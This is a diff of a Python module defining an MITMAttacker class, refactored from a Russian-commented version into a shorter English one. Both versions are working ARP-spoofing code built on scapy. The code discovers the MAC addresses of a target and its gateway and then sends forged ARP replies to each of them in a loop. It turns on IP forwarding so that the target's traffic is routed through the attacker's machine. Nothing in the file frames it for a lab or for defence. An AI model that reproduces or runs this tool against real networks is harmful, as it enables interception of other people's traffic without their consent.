@@ -1,220 +1,113 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
-import platform
 import time
 import threading
-import subprocess
+import platform
 import os
-from typing import Optional, Dict
-from utils import enable_ip_forwarding, disable_ip_forwarding
-
+from utils import enable_ip_forward, disable_ip_forward
 
 class MITMAttacker:
-    def __init__(self, target_ip: str, gateway_ip: str, interface: str):
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.interface = interface
+    def __init__(self, target, gateway, intf):
+        self.target = target
+        self.gateway = gateway
+        self.intf = intf
         self.running = False
-        self.attack_thread = None
-        self.spoofing = False
+        self.thread = None
 
-        # MAC адреса
-        self.target_mac: Optional[str] = None
-        self.gateway_mac: Optional[str] = None
-        self.attacker_mac: Optional[str] = None
+        self.target_mac = None
+        self.gateway_mac = None
+        self.my_mac = None
 
-        # Статистика
-        self.spoof_packets_sent = 0
+        self.count = 0
         self.start_time = 0
+        self.npcap = self._check_npcap()
 
-        # Проверяем наличие Npcap
-        self.npcap_available = self._check_npcap()
-
-    def _check_npcap(self) -> bool:
-        """Проверить наличие Npcap/WinPcap"""
+    def _check_npcap(self):
         if platform.system() != "Windows":
-            return True  # На Linux/Mac всегда доступно
+            return True
 
-        # Проверяем наличие npcap в системных файлах
-        npcap_paths = [
+        paths = [
             r"C:\Windows\System32\Npcap",
             r"C:\Program Files\Npcap",
-            r"C:\Program Files (x86)\Npcap",
-            r"C:\Windows\System32\wpcap.dll",
-            r"C:\Windows\System32\Packet.dll"
+            r"C:\Windows\System32\wpcap.dll"
         ]
+        return any(os.path.exists(p) for p in paths)
 
-        for path in npcap_paths:
-            if os.path.exists(path) or os.path.exists(path + ".dll"):
-                return True
-
-        return False
-
-        # Получаем MAC адреса
-        self._get_macs()
-
-    def _get_macs(self):
-        """Получить MAC адреса целевых устройств"""
-        if platform.system() == "Windows":
-            # На Windows используем разные методы в зависимости от наличия Npcap
-            if not self.npcap_available:
-                print("[!] Npcap not available, using limited MAC detection")
-                print("[!] ARP spoofing will not work without Npcap")
-
-                # Без Npcap можем только попробовать получить MAC из ARP кэша
-                self.target_mac = self._get_mac_from_arp_cache(self.target_ip)
-                self.gateway_mac = self._get_mac_from_arp_cache(self.gateway_ip)
-
-                # Получаем собственный MAC через ipconfig
-                try:
-                    result = subprocess.check_output("ipconfig /all", shell=True, text=True, stderr=subprocess.DEVNULL)
-                    lines = result.split('\n')
-                    for line in lines:
-                        if "Physical Address" in line:
-                            parts = line.split(':')
-                            if len(parts) > 1:
-                                self.attacker_mac = parts[1].strip().replace('-', ':')
-                                break
-                except:
-                    self.attacker_mac = "00:00:00:00:00:00"
-            else:
-                # С Npcap используем оригинальный код
-                try:
-                    from scapy.all import ARP, Ether, srp
-
-                    self.target_mac = self._get_mac(self.target_ip)
-                    self.gateway_mac = self._get_mac(self.gateway_ip)
-
-                    # Получаем собственный MAC
-                    try:
-                        result = subprocess.check_output(f"getmac /fo csv /v", shell=True, text=True)
-                        lines = result.split('\n')
-                        for line in lines:
-                            if self.interface in line:
-                                parts = line.split(',')
-                                if len(parts) > 2:
-                                    self.attacker_mac = parts[2].strip().replace('"', '').replace('-', ':')
-                                    break
-                    except:
-                        # Если не получилось через getmac, используем ipconfig
-                        result = subprocess.check_output("ipconfig /all", shell=True, text=True, stderr=subprocess.DEVNULL)
-                        lines = result.split('\n')
-                        for line in lines:
-                            if "Physical Address" in line and self.interface.lower() in line.lower():
-                                parts = line.split(':')
-                                if len(parts) > 1:
-                                    self.attacker_mac = parts[1].strip().replace('-', ':')
-                                    break
-                except Exception as e:
-                    print(f"[!] Error getting MAC addresses with Npcap: {e}")
-                    self.target_mac = "00:00:00:00:00:00"
-                    self.gateway_mac = "00:00:00:00:00:00"
-                    self.attacker_mac = "00:00:00:00:00:00"
-        else:
-            # Оригинальный код для Linux
+    def _get_mac(self, ip):
+        """Get MAC address for IP"""
+        try:
             from scapy.all import ARP, Ether, srp
 
-            self.target_mac = self._get_mac(self.target_ip)
-            self.gateway_mac = self._get_mac(self.gateway_ip)
+            # Check ARP cache first
+            if platform.system() == "Windows":
+                import subprocess
+                r = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, errors='ignore')
+                for line in r.split('\n'):
+                    if ip in line:
+                        parts = line.split()
+                        for p in parts:
+                            if ':' in p or '-' in p:
+                                return p.replace('-', ':')
 
-            # Получаем собственный MAC
-            try:
-                with open(f"/sys/class/net/{self.interface}/address", 'r') as f:
-                    self.attacker_mac = f.read().strip()
-            except:
-                pass
+            # Send ARP request
+            arp = ARP(pdst=ip)
+            eth = Ether(dst="ff:ff:ff:ff:ff:ff")
+            pkt = eth/arp
 
-    def _get_mac_from_arp_cache(self, ip: str) -> Optional[str]:
-        """Получить MAC адрес из ARP кэша Windows"""
-        try:
-            result = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, stderr=subprocess.DEVNULL)
-            lines = result.split('\n')
-            for line in lines:
-                if ip in line:
-                    parts = line.split()
-                    for part in parts:
-                        if ':' in part or '-' in part:
-                            return part.replace('-', ':')
+            ans = srp(pkt, timeout=1, verbose=False, iface=self.intf)[0]
+            if ans:
+                return ans[0][1].hwsrc
         except:
             pass
         return None
 
-    def _get_mac(self, ip: str) -> Optional[str]:
-        """Получить MAC адрес по IP"""
-        if platform.system() == "Windows" and not self.npcap_available:
-            # Без Npcap используем ARP кэш
-            return self._get_mac_from_arp_cache(ip)
-
+    def _get_my_mac(self):
+        """Get our MAC address"""
         try:
-            # Оригинальный код для Linux/Windows с Npcap
-            from scapy.all import ARP, Ether, srp
+            if platform.system() == "Windows":
+                import subprocess
+                r = subprocess.check_output("ipconfig /all", shell=True, text=True, errors='ignore')
+                for line in r.split('\n'):
+                    if "Physical Address" in line and self.intf in line:
+                        parts = line.split(':')
+                        if len(parts) > 1:
+                            return parts[1].strip().replace('-', ':')
+            else:
+                with open(f"/sys/class/net/{self.intf}/address") as f:
+                    return f.read().strip()
+        except:
+            pass
+        return "00:00:00:00:00:00"
 
-            # Пытаемся получить из ARP кэша
-            result = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, stderr=subprocess.DEVNULL)
-            lines = result.split('\n')
-            for line in lines:
-                if ip in line:
-                    parts = line.split()
-                    for part in parts:
-                        if ':' in part or '-' in part:
-                            return part.replace('-', ':')
-
-            # Если не нашли в ARP кэше, отправляем ARP запрос
-            arp_request = ARP(pdst=ip)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            arp_request_broadcast = broadcast / arp_request
-
-            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, iface=self.interface)[0]
-
-            if answered_list:
-                return answered_list[0][1].hwsrc
-
-        except Exception as e:
-            print(f"[!] Ошибка получения MAC для {ip}: {e}")
-
-        return None
-
-    def spoof(self, target_ip: str, spoof_ip: str, target_mac: Optional[str] = None):
-        """Отправить поддельный ARP пакет"""
-        if platform.system() == "Windows" and not self.npcap_available:
-            print("[!] ARP spoofing requires Npcap on Windows")
-            return False
-
-        if platform.system() != "Windows" and not check_root():
-            print("[!] ARP spoofing requires root privileges on Linux")
+    def spoof(self, target_ip, spoof_ip, target_mac=None):
+        """Send spoofed ARP packet"""
+        if platform.system() == "Windows" and not self.npcap:
             return False
 
         try:
             from scapy.all import ARP, send
 
-            if not target_mac:
-                target_mac = self._get_mac(target_ip)
+            mac = target_mac or self._get_mac(target_ip)
+            if not mac:
+                return False
 
-            if target_mac:
-                # Создаем ARP ответ (op=2) с подмененным IP
-                arp_response = ARP(
-                    op=2,  # ARP ответ
-                    pdst=target_ip,
-                    hwdst=target_mac,
-                    psrc=spoof_ip,
-                    hwsrc=self.attacker_mac
-                )
+            pkt = ARP(
+                op=2,
+                pdst=target_ip,
+                hwdst=mac,
+                psrc=spoof_ip,
+                hwsrc=self.my_mac
+            )
 
-                # Отправляем пакет
-                send(arp_response, verbose=False, iface=self.interface)
-                self.spoof_packets_sent += 1
-                return True
+            send(pkt, verbose=False, iface=self.intf)
+            self.count += 1
+            return True
+        except:
+            return False
 
-        except Exception as e:
-            print(f"[!] Ошибка отправки ARP спуфинга: {e}")
-
-        return False
-
-    def restore(self, target_ip: str, gateway_ip: str):
-        """Восстановить ARP таблицы"""
-        if platform.system() == "Windows" and not self.npcap_available:
-            print("[!] ARP restoration requires Npcap on Windows")
+    def restore(self, target_ip, gateway_ip):
+        """Restore ARP tables"""
+        if platform.system() == "Windows" and not self.npcap:
             return False
 
         try:
@@ -224,8 +117,8 @@ class MITMAttacker:
             gateway_mac = self._get_mac(gateway_ip)
 
             if target_mac and gateway_mac:
-                # Восстанавливаем ARP запись цели
-                arp_target = ARP(
+                # Restore target
+                pkt1 = ARP(
                     op=2,
                     pdst=target_ip,
                     hwdst=target_mac,
@@ -233,8 +126,8 @@ class MITMAttacker:
                     hwsrc=gateway_mac
                 )
 
-                # Восстанавливаем ARP запись шлюза
-                arp_gateway = ARP(
+                # Restore gateway
+                pkt2 = ARP(
                     op=2,
                     pdst=gateway_ip,
                     hwdst=gateway_mac,
@@ -242,129 +135,84 @@ class MITMAttacker:
                     hwsrc=target_mac
                 )
 
-                # Отправляем по несколько пакетов для надежности
-                send(arp_target, count=3, verbose=False, iface=self.interface)
-                send(arp_gateway, count=3, verbose=False, iface=self.interface)
-
+                send(pkt1, count=3, verbose=False, iface=self.intf)
+                send(pkt2, count=3, verbose=False, iface=self.intf)
                 return True
-
-        except Exception as e:
-            print(f"[!] Ошибка восстановления ARP: {e}")
-
+        except:
+            pass
         return False
 
     def start_attack(self):
-        """Запустить MITM атаку"""
+        """Start MITM attack"""
         if self.running:
             return
 
-        if platform.system() == "Windows" and not self.npcap_available:
-            print("[!] MITM attacks not available on Windows without Npcap")
-            print("[!] Install Npcap from https://nmap.org/npcap/ for full functionality")
-            print("[!] Running in demonstration mode only")
+        # Get MAC addresses
+        self.target_mac = self._get_mac(self.target)
+        self.gateway_mac = self._get_mac(self.gateway)
+        self.my_mac = self._get_my_mac()
 
-            self.running = True
-            self.spoofing = True
-            self.start_time = time.time()
-
-            # В демо-режиме просто показываем сообщения
-            print(f"[*] Demonstration: MITM attack would target {self.target_ip} via {self.gateway_ip}")
-            print("[*] This is a simulation - install Npcap for real MITM attacks")
-
-            try:
-                while self.running:
-                    time.sleep(2)
-                    print(f"[*] Simulation: Sending ARP spoof packets...")
-
-            except KeyboardInterrupt:
-                self.stop_attack()
-            except Exception as e:
-                print(f"[!] Error in MITM simulation: {e}")
-                self.stop_attack()
-
+        if not self.target_mac or not self.gateway_mac:
+            print("Could not get MAC addresses")
             return
 
-        # Проверяем MAC адреса
-        if not self.target_mac:
-            print(f"[!] Не удалось получить MAC адрес цели: {self.target_ip}")
-            return
-        if not self.gateway_mac:
-            print(f"[!] Не удалось получить MAC адрес шлюза: {self.gateway_ip}")
-            return
-
-        # Включаем IP forwarding (только на Linux)
+        # Enable IP forwarding (Linux/Mac)
         if platform.system() != "Windows":
-            if not enable_ip_forwarding():
-                print("[!] Не удалось включить IP forwarding. Атака может не работать.")
+            enable_ip_forward()
 
         self.running = True
-        self.spoofing = True
+        self.count = 0
         self.start_time = time.time()
-        self.spoof_packets_sent = 0
 
-        print(f"[*] Запуск MITM атаки: {self.target_ip} -> {self.gateway_ip}")
-        print(f"[*] MAC цели: {self.target_mac}")
-        print(f"[*] MAC шлюза: {self.gateway_mac}")
-        print(f"[*] Ваш MAC: {self.attacker_mac}")
+        print(f"MITM: {self.target} -> {self.gateway}")
+        print(f"Target MAC: {self.target_mac}")
+        print(f"Gateway MAC: {self.gateway_mac}")
+        print(f"My MAC: {self.my_mac}")
 
         try:
             while self.running:
-                # Спуфим цель, что мы шлюз
-                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
-
-                # Спуфим шлюз, что мы цель
-                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
-
+                self.spoof(self.target, self.gateway, self.target_mac)
+                self.spoof(self.gateway, self.target, self.gateway_mac)
                 time.sleep(2)
-
         except KeyboardInterrupt:
-            self.stop_attack()
+            pass
         except Exception as e:
-            print(f"[!] Ошибка в MITM атаке: {e}")
+            print(f"MITM error: {e}")
+        finally:
             self.stop_attack()
 
     def stop_attack(self):
-        """Остановить атаку и восстановить сеть"""
+        """Stop attack and restore"""
         if not self.running:
             return
 
-        print("\n[*] Остановка MITM атаки...")
-
         self.running = False
-        self.spoofing = False
 
-        # Восстанавливаем ARP таблицы (только если есть Npcap/root)
+        print("Stopping MITM...")
+
+        # Restore ARP
         if platform.system() == "Windows":
-            if self.npcap_available:
-                print("[*] Восстановление ARP таблиц...")
-                self.restore(self.target_ip, self.gateway_ip)
-            else:
-                print("[*] Skipping ARP restoration (Npcap not available)")
+            if self.npcap:
+                self.restore(self.target, self.gateway)
         else:
-            print("[*] Восстановление ARP таблиц...")
-            self.restore(self.target_ip, self.gateway_ip)
+            self.restore(self.target, self.gateway)
 
-        # Выключаем IP forwarding (только на Linux)
+        # Disable IP forwarding
         if platform.system() != "Windows":
-            disable_ip_forwarding()
+            disable_ip_forward()
 
-        # Выводим статистику
-        duration = time.time() - self.start_time
-        print(f"[*] Атака длилась: {duration:.1f} секунд")
-        print(f"[*] Отправлено ARP пакетов: {self.spoof_packets_sent}")
-        print("[*] Сеть восстановлена")
+        dur = time.time() - self.start_time
+        print(f"Duration: {dur:.1f}s")
+        print(f"Packets: {self.count}")
+        print("Network restored")
 
-    def get_status(self) -> Dict:
-        """Получить статус атаки"""
+    def get_status(self):
         return {
             "running": self.running,
-            "spoofing": self.spoofing,
-            "target_ip": self.target_ip,
-            "gateway_ip": self.gateway_ip,
-            "target_mac": self.target_mac,
-            "gateway_mac": self.gateway_mac,
-            "attacker_mac": self.attacker_mac,
-            "spoof_packets_sent": self.spoof_packets_sent,
+            "target_ip": self.target,
+            "gateway_ip": self.gateway,
+            "interface": self.intf,
+            "spoof_packets_sent": self.count,
             "duration": time.time() - self.start_time if self.start_time > 0 else 0,
-            "npcap_available": self.npcap_available
+            "npcap_available": self.npcap
         }
